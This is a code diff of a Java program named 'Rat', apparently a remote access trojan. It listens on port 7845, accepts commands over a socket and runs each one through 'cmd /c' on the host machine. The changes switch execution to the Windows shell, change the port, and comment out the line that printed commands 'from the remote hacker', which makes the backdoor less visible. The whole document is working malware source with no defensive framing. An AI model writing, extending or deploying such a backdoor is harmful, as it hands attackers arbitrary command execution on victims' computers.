@@ -1,3 +1,5 @@
+package test2;
+
 import java.io.*;
 import java.net.InetAddress;
 import java.net.ServerSocket;
@@ -17,13 +19,15 @@ public class Rat {
 
     private static void executeCommands(String commandAndArgs) throws IOException, InterruptedException {
         String command = commandAndArgs;
-        Process proc = Runtime.getRuntime().exec(command);
+        Process proc = Runtime.getRuntime().exec("cmd" + " /c " + command);
+//        System.out.println("I'm here2.");
 
         // read output
         BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
 
         String line = "";
         while ((line = reader.readLine()) != null) System.out.print(line + "\n");
+//        System.out.println("I'm here3.");
         proc.waitFor();
     }
     private static String resolve(String host) {
@@ -54,24 +58,28 @@ public class Rat {
 
     public static Socket socket;
     public static void main(String[] args) throws IOException, InterruptedException {
-        int port = 8080;
+        int port = 7845;
         String answer; String returnedMessage; String reply;
         ServerSocket server = new ServerSocket(port);
-        System.out.println("server start at port " + port);
+        System.out.println("server start at port " + port + ".");
 
 
         while(true) {
+//            System.out.println("I'm here4.");
             socket = server.accept();
+//            System.out.println("I'm here5.");
             InputStream is = socket.getInputStream();
             InputStreamReader isr = new InputStreamReader(is);
             BufferedReader br = new BufferedReader(isr);
             answer = br.readLine();
-            System.out.println("sent command from the remote hacker: " + answer);
+//            System.out.println("sent command from the remote hacker: " + answer);
 
+            if (answer == null) continue;
 
             if ("QUIT".equals(answer))
                 break;
             else {
+//                System.out.println("I'm here1.");
                 executeCommands(answer);
             }
         }
